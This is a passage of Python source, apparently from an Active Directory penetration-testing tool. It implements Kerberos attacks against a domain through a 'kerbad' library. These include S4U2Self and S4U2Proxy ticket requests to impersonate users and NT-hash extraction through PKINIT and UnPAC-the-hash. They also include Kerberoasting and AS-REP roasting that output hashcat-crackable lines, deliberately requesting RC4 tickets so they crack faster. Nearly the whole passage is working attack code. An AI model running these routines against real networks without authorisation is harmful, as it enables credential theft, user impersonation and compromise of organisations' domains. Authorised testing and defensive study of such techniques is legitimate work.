        # Bug #1 fix: use to_bytes() instead of to_file(BytesIO).
        ccache_bytes = client.ccache.to_bytes()
        print_info_debug(
            f"[kerberos_transport] s4u2self: success, ccache size={len(ccache_bytes)}"
        )
        return ccache_bytes

    except KerberosTransportError:
        raise
    except Exception as exc:
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)


async def s4u2proxy(
    config: KerberosConfig,
    *,
    target_user: str,
    service_spn: str,
) -> bytes:
    """Obtain an S4U2Proxy service ticket (full delegation chain).

    Internally calls ``getST`` which chains S4U2Self → S4U2Proxy.

    Args:
        config:      Machine account / service account credentials.
        target_user: UPN of the user to impersonate.
        service_spn: Target SPN for the delegated ticket.

    Returns:
        Serialized ccache bytes containing the delegated ticket.

    Raises:
        KerberosTransportError and subclasses.
    """
    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
    from kerbad.common.spn import KerberosSPN  # noqa: PLC0415

    url = _build_kerberos_url(config)
    print_info_debug(
        f"[kerberos_transport] s4u2proxy: target_user={target_user} spn={service_spn}"
    )

    try:
        cu = KerberosClientFactory.from_url(url)
        client = cu.get_client()

        override_etype = config.etypes if config.etypes else None
        await client.with_clock_skew(client.get_TGT, override_etype=override_etype)

        target_spn_obj = KerberosSPN.from_upn(target_user, default_realm=config.domain)
        service_spn_obj = KerberosSPN.from_spn(service_spn, default_realm=config.domain)
        await client.with_clock_skew(client.getST, target_spn_obj, service_spn_obj)

        # Bug #1 fix: use to_bytes() instead of to_file(BytesIO).
        ccache_bytes = client.ccache.to_bytes()
        print_info_debug(
            f"[kerberos_transport] s4u2proxy: success, ccache size={len(ccache_bytes)}"
        )
        return ccache_bytes

    except KerberosTransportError:
        raise
    except Exception as exc:
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)


async def get_nt_from_pkinit(config: KerberosConfig) -> list[tuple[str, str]]:
    """Retrieve NT hash via PKINIT + UnPAC-the-hash (U2U technique).

    Requires ``config.cert_pfx_path`` (and optionally ``cert_pfx_password``).
    Uses ``kerbad/examples/getNT.py`` pattern: PKINIT TGT → U2U → extract PAC.

    Clock contract: this function is shell-free transport and does NOT carry a
    ``shell``, so it cannot run the physical clock-sync guard itself. PKINIT/U2U
    is far more sensitive to clock skew than AS/TGS (the per-request kerbad skew
    offset is insufficient — a skewed clock yields KDC_ERR_CLIENT_NOT_TRUSTED).
    The shell-bearing CALLER MUST ensure the host clock is fresh before invoking
    this (via ``ensure_clock_synced_fresh`` / ``do_ensure_clock_synced_fresh``).
    Do NOT thread ``shell`` through ``KerberosConfig`` to fix this here.

    Returns:
        List of (label, nt_hash_hex) pairs from the PAC.

    Raises:
        KerberosTransportError and subclasses.
    """
    if not config.cert_pfx_path:
        raise KerberosTransportError(
            "get_nt_from_pkinit requires cert_pfx_path in KerberosConfig"
        )

    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
    from kerbad.protocol.external.ticketutil import get_NT_from_PAC  # noqa: PLC0415

    pfx_password = config.cert_pfx_password or ""
    user_part = f"{_encode(config.domain.upper())}\\{_encode(config.username)}"
    url = (
        f"kerberos+pfx://{user_part}:{_encode(pfx_password)}@{config.kdc_ip}"
        f"/?certdata={_encode(config.cert_pfx_path)}"
    )
    print_info_debug("[kerberos_transport] get_nt_from_pkinit: PKINIT U2U flow")

    try:
        cu = KerberosClientFactory.from_url(url)
        client = cu.get_client()
        _tgs, _enctgs, _key, decticket = await client.with_clock_skew(client.U2U)
        results = get_NT_from_PAC(client.pkinit_tkey, decticket)
        print_info_debug(
            f"[kerberos_transport] get_nt_from_pkinit: found {len(results)} NT hash(es)"
        )
        return [(str(label), str(nt)) for label, nt in results]

    except KerberosTransportError:
        raise
    except Exception as exc:
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)


# ---------------------------------------------------------------------------
# Roasting helpers (used by enumeration/kerberos.py)
# ---------------------------------------------------------------------------


def _maybe_emit_roast_progress(
    *,
    operation: str,
    label: str,
    current: int,
    total: int,
    detail: str | None,
    emit_state: dict[str, float],
    force: bool = False,
    done: bool = False,
) -> None:
    """Throttled live current-operation emit for the roasting iteration loops.

    Pure observability: mirrors the per-ticket forward motion of the kerberoast /
    AS-REP roast loops into the structured event stream so the platform shows
    "Kerberoasting · X of N SPNs" live. Throttled to ~1.5s (same budget as the
    port-scan emitter) so a large target set never floods the channel. No secret
    reaches the event — only counts + the target domain. Client-safe, English,
    vendor-neutral label. No-op unless the structured sink is enabled.

    Pass ``done=True`` on the FINAL tick (the loop finished) so the platform's
    live strip clears the operation instead of freezing on the last ticket count.
    """
    import time as _time  # noqa: PLC0415

    now = _time.time()
    if not force and now - emit_state.get("last_emit", 0.0) < 1.5:
        return
    emit_state["last_emit"] = now
    try:
        from adscan_internal.cli.ci_events import (  # noqa: PLC0415
            emit_operation_progress,
        )

        emit_operation_progress(
            operation=operation,
            label=label,
            phase="quick_credential_wins",
            phase_label="Quick Credential Wins",
            current=current or None,
            total=total if total > 0 else None,
            detail=detail or None,
            done=done,
        )
    except Exception:  # noqa: BLE001 -- telemetry must not abort roasting
        pass


async def kerberoast_users(
    config: KerberosConfig,
    usernames: list[str],
    *,
    target_domain: Optional[str] = None,
    etypes: Optional[list[int]] = None,
) -> list[tuple[str, str | None, str | None]]:
    """Kerberoast a list of usernames and return hashcat 13100/18200 lines.

    Uses ``kerbad.security.kerberoast`` which handles TGT acquisition, TGS-REQ
    per SPN, and ``TGSTicket2hashcat`` formatting in a single async generator.

    Cross-realm: when ``target_domain`` differs from ``config.domain`` the
    kerbad generator is called with ``cross_domain=True``.

    Args:
        config:        Authenticated user's Kerberos config.
        usernames:     List of sAMAccountNames to roast (no domain suffix).
        target_domain: Target realm when different from config.domain.
        etypes:        Override etype list (default: [23, 17, 18]).

    Returns:
        List of ``(username, hash_line_or_None, error_str_or_None)`` tuples.
        The hash_line is in hashcat ``$krb5tgs$`` format when not None.
    """
    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
    from kerbad.security import kerberoast as _kerberoast  # noqa: PLC0415

    url = _build_kerberos_url(config, use_auth_kdc=True)
    domain = target_domain or config.domain
    # override_etype now controls ONLY the TGS-REQ (the roasted service ticket) —
    # kerbad's kerberoast generator decouples the TGT (which uses the credential's
    # own AES-first preference so it authenticates against AES-only KDCs) from the
    # TGS. So request RC4-first here: an RC4 service ticket ($krb5tgs$23$) cracks
    # ~10x faster than AES, and the KDC degrades to AES automatically for AES-only
    # service accounts. (Matches the asreproast default and impacket/Rubeus.)
    override_etype = etypes or config.etypes or [23, 17, 18]
    cross_domain = bool(
        target_domain and target_domain.lower() != config.domain.lower()
    )

    print_info_debug(
        f"[kerberos_transport] kerberoast_users: {len(usernames)} users "
        f"domain={domain} cross_domain={cross_domain} etypes={override_etype}"
    )

    try:
        # AES-only KDC fix: probe ETYPE-INFO2 salt and, if the KDC uses a non-default
        # salt, derive the AES256 key and swap the URL to kerberos+aes256 so that
        # _kerberoast (which builds its own client internally) also authenticates
        # correctly.  Without this, _kerberoast re-derives the key with the default
        # salt (KDC_ERR_PREAUTH_FAILED).
        if config.password:
            _probe_url = _build_kerberos_url(config, use_auth_kdc=True)
            _probe_cu = KerberosClientFactory.from_url(_probe_url)
            _probe_client = _probe_cu.get_client()
            await _probe_and_set_etype_info2_salt(_probe_client, config)
            salt = getattr(_probe_client, "server_salt", None)
            if salt is not None:
                # Derive AES256 key with the correct salt
                try:
                    from kerbad.protocol.encryption import (
                        string_to_key as _s2k,
                        Enctype as _Enctype,
                    )  # noqa: PLC0415

                    _salt_b = salt.encode("utf-8") if isinstance(salt, str) else salt
                    aes_key_obj = _s2k(
                        _Enctype.AES256, config.password.encode("utf-8"), _salt_b
                    )
                    aes_hex = aes_key_obj.contents.hex()
                    url = _build_kerberos_url(
                        KerberosConfig(
                            domain=config.domain,
                            kdc_ip=config.auth_kdc_ip or config.kdc_ip,
                            username=config.username,
                            aes_key=aes_hex,
                            etypes=config.etypes,
                            auth_kdc_ip=config.auth_kdc_ip,
                            target_kdc_ip=config.target_kdc_ip,
                        ),
                        use_auth_kdc=True,
                    )
                    print_info_debug(
                        "[kerberos_transport] kerberoast_users: swapped to AES256 key URL (salt probe succeeded)"
                    )
                except Exception as _derive_exc:
                    print_info_debug(
                        f"[kerberos_transport] kerberoast_users: AES256 key derivation failed (non-fatal): {_derive_exc}"
                    )

        cu = KerberosClientFactory.from_url(url)
        results: list[tuple[str, str | None, str | None]] = []
        _total = len(usernames)
        _emit_state: dict[str, float] = {"last_emit": 0.0}
        async for username, hash_line, err in _kerberoast(
            cu,
            usernames,
            domain,
            override_etype=override_etype,
            cross_domain=cross_domain,
        ):
            results.append((username, hash_line, str(err) if err is not None else None))
            _maybe_emit_roast_progress(
                operation="kerberoasting",
                label="Kerberoasting",
                current=len(results),
                total=_total,
                detail=domain,
                emit_state=_emit_state,
            )
        # Land the live surface on the real total on completion, marked done so
        # the platform's live strip clears the operation instead of freezing.
        _maybe_emit_roast_progress(
            operation="kerberoasting",
            label="Kerberoasting",
            current=len(results),
            total=_total,
            detail=domain,
            emit_state=_emit_state,
            force=True,
            done=True,
        )
        return results

    except Exception as exc:
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)


async def asreproast_users(
    kdc_ip: str,
    domain: str,
    usernames: list[str],
    *,
    etypes: Optional[list[int]] = None,
) -> list[tuple[str, str | None, str | None]]:
    """AS-REP roast a list of usernames (no pre-auth required on this side).

    Uses ``kerbad.security.asreproast`` which sends AS-REQ without pre-auth
    for each username and calls ``TGTTicket2hashcat`` on the AS-REP.

    This function requires *no* credential because AS-REP roasting intentionally
    targets accounts that do not enforce pre-authentication.

    Args:
        kdc_ip:    KDC IP to send AS-REQ to.
        domain:    Kerberos realm.
        usernames: List of sAMAccountNames.
        etypes:    Override etype list (default: [23, 17, 18]).

    Returns:
        List of ``(username, hash_line_or_None, error_str_or_None)`` tuples.
        hash_line is in hashcat ``$krb5asrep$`` format when not None.
    """
    from kerbad.aioclient import AIOKerberosClient  # noqa: PLC0415
    from kerbad.common.creds import KerberosCredential  # noqa: PLC0415
    from kerbad.common.target import KerberosTarget  # noqa: PLC0415
    from kerbad.common.utils import TGTTicket2hashcat  # noqa: PLC0415

    # RC4 (23) first: Windows KDCs honor the client's etype preference order in
    # the AS-REQ.  Listing RC4 first gets RC4 when the KDC supports it — same
    # strategy as impacket/NXC.  RC4 is ~200× faster to crack than AES.
    # Fall back to AES-128 then AES-256 if the KDC rejects RC4.
    override_etype = etypes or [23, 17, 18]
    target = KerberosTarget(host=kdc_ip)

    print_info_debug(
        f"[kerberos_transport] asreproast_users: {len(usernames)} users "
        f"domain={domain} etypes={override_etype}"
    )

    # kerbad's asreproast() generator in security.py does not set cred.nopreauth=True,
    # so it tries to encrypt a pre-auth timestamp — which requires a key it does not have.
    # We bypass the generator and use AIOKerberosClient directly with nopreauth=True,
    # which sends an AS-REQ without pre-auth and captures the raw AS-REP for hashcat output.
    try:
        per_user: dict[str, tuple[str | None, str | None]] = {}
        _total = len(usernames)
        _emit_state: dict[str, float] = {"last_emit": 0.0}
        for username in usernames:
            cred = KerberosCredential()
            cred.domain = domain
            cred.username = username
            cred.nopreauth = True
            kcomm = AIOKerberosClient(cred, target)
            try:
                await kcomm.with_clock_skew(
                    kcomm.get_TGT, override_etype=override_etype, decrypt_tgt=False
                )
                per_user[username] = (TGTTicket2hashcat(kcomm.kerberos_TGT), None)
            except Exception as exc:
                per_user[username] = (None, str(exc))
            _maybe_emit_roast_progress(
                operation="asrep_roasting",
                label="AS-REP roasting",
                current=len(per_user),
                total=_total,
                detail=domain,
                emit_state=_emit_state,
            )

        # Land the live surface on the real total on completion, marked done so
        # the platform's live strip clears the operation instead of freezing.
        _maybe_emit_roast_progress(
            operation="asrep_roasting",
            label="AS-REP roasting",
            current=len(per_user),
            total=_total,
            detail=domain,
            emit_state=_emit_state,
            force=True,
            done=True,
        )
        return [(u, h, e) for u, (h, e) in per_user.items()]

    except Exception as exc:
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)
